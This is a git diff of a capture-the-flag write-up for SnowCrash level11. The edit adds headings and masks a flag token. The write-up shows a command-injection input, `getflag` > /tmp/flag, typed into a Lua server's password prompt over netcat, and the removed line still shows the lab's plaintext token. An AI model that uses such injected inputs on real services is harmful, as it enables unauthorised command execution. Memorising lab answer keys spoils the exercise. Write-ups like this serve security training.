@@ -1,3 +1,5 @@
+# Level11
+
 ## Exploring the exercice
 
 ```bash 
@@ -9,7 +11,7 @@ What is lua ?
 A lightweight, fast programming language often used for scripting and embedding into applications. Lua is valued for its simplicity and flexibility and is commonly used for : video game scripting, embedded applications and interfaces (wireshark, nginx) and others. 
 
 
-Okay let's have a look at the file 
+## Inspecting the file
 
 ```bash 
 $ cat level11.lua
@@ -58,13 +60,17 @@ Password:
 ```
 
 As expected the server waits for a password. 
+
+## Getting the flag
+
 Like in previous exercices we are going to try to inject the getflag command. After a few tries we found the correct syntax : 
+
 ```bash
 $ nc localhost 5151
 Password: `getflag` > /tmp/flag
 Erf nope..
 level11@SnowCrash:~$ cat /tmp/flag
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+Check flag.Here is your token : **********
 ```
 
 
